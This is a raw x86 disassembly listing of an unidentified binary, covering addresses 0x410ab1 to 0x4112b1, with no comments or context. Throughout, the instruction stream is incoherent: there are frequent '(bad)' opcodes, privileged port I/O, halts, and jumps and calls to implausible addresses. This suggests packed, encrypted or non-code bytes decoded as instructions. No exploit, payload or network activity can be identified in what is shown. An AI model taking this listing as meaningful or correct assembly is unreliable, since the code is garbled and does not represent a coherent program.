  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
